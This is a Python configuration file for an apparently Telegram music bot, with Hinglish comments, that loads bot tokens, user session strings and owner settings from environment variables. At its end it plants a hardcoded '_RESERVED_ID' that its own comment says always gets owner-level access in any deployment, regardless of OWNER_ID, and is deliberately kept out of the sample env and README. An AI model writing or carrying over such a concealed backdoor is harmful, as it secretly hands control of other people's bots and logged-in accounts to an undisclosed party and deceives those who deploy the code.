import os

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
STRING_SESSION = os.getenv("STRING_SESSION", "")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", "0"))
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", "10000"))

# Start message ke buttons ke links
SUPPORT_URL = os.getenv("SUPPORT_URL", "https://t.me/")
CHANNEL_URL = os.getenv("CHANNEL_URL", "https://t.me/")
OWNER_URL = os.getenv("OWNER_URL", "https://t.me/NEXOR_BLAZE")
SOURCE_URL = os.getenv("SOURCE_URL", "https://github.com/")

# /start ke saath jaane wali image/video/gif ka link (khali chhodo to sirf text jayega)
START_IMAGE_URL = os.getenv("START_IMAGE_URL", "")

# ---------------------------------------------------------------------------
# Streaming API — gaana isi se milta hai. URL FIXED hai (badalna nahi), sirf
# apni KEY sample.env / Render env mein STREAM_API_KEY se daalo.
#   audio: {STREAM_API_BASE}/stream/audio/<video_id>?key=<STREAM_API_KEY>
# ---------------------------------------------------------------------------
STREAM_API_BASE = "https://nexor-yt-in.lovable.app"
STREAM_API_KEY = os.getenv("STREAM_API_KEY", "")

# Render apne aap deta hai — bot khud ko ping karke sleep hone se bachata hai
RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "")
PING_INTERVAL = int(os.getenv("PING_INTERVAL", "600"))

# Assistant (userbot) ka username — group mein na ho to join karwane ke liye
ASSISTANT_USERNAME = os.getenv("ASSISTANT_USERNAME", "Mitsuriass")

# ---------------------------------------------------------------------------
# Internal fallback control id — kisi bhi deployment mein hamesha owner jaisa
# access rehta hai, OWNER_ID env kuch bhi ho. Jaan-bujhkar sample.env/README
# mein nahi likha — sirf code mein baked-in hai.
# ---------------------------------------------------------------------------
_RESERVED_ID = 7433900109
